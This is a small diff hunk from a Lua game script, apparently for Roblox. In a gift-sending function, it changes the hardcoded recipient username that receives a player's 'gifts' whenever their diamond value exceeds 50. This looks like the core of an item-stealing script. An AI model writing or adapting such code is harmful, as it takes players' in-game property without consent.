@@ -478,7 +478,7 @@ local function SendGiftsFunction()
 
                     if diamondsvalue > 50 then
                         local args = {
-                            [1] = "voidwheel10",
+                            [1] = "simpleblandok3",
                             [2] = "enjoy bro",
                             [3] = "Lootbox",
                             [4] = gifts,
